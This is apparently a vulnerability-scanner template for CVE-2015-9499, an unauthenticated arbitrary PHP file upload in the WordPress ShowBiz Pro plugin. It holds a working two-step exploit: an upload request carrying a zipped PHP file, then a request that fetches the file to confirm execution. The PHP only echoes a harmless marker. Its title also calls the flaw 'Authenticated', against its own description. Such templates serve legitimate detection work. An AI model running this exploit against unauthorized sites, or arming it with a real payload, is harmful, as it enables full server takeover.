http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body,'Update in progress...','wp-admin/admin.php?page=showbiz&view=sliders')
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWJDMjlXCUnC1rnZg


    ------WebKitFormBoundaryWJDMjlXCUnC1rnZg

    Content-Disposition: form-data; name="action"


    showbiz_ajax_action

    ------WebKitFormBoundaryWJDMjlXCUnC1rnZg

    Content-Disposition: form-data; name="client_action"


    update_plugin

    ------WebKitFormBoundaryWJDMjlXCUnC1rnZg

    Content-Disposition: form-data; name="update_file"; filename="{{filename}}.zip"

    Content-Type: application/zip


    {{zip(''{{filename}}.php'',''<?php echo base64_decode(\''{{b64marker}}\''); ?>'')}}

    ------WebKitFormBoundaryWJDMjlXCUnC1rnZg--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body,'{{marker}}')
    type: dsl
  raw:
  - 'GET /wp-content/plugins/showbizpro/temp/update_extract/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2015-9499
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:themepunch:showbiz_pro:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2015-9499
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.98514
    epss-score: 0.67891
  description: 'The WordPress ShowBiz Pro plugin version <= 1.7.1 allows arbitrary
    PHP file upload via the `admin-ajax.php` endpoint.This leads to unauthenticated
    remote code execution.

    '
  impact: 'Attackers can upload and execute arbitrary PHP files without authentication,
    leading to complete server compromise and data breach.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: showbiz_pro
    vendor: themepunch
    verified: true
  name: WordPress ShowBiz Pro <= 1.7.1 - Authenticated Arbitrary File Upload to RCE
  reference:
  - https://wpscan.com/vulnerability/1c8f1872-a699-464a-9c6b-f8a49ca22ecb/
  - https://nvd.nist.gov/vuln/detail/CVE-2015-9499
  - https://packetstormsecurity.com/files/132737/
  remediation: 'Remove or disable the plugin immediately and update to a patched version
    if available.

    '
  severity: critical
  tags: cve,cve2015,wpscan,packetstorm,wp,wordpress,wp-plugin,showbiz,uplo,intrusive,vkev,vuln
variables:
  b64marker: '{{base64(marker)}}'
  filename: '{{rand_base(5)}}'
  marker: '{{randstr}}'
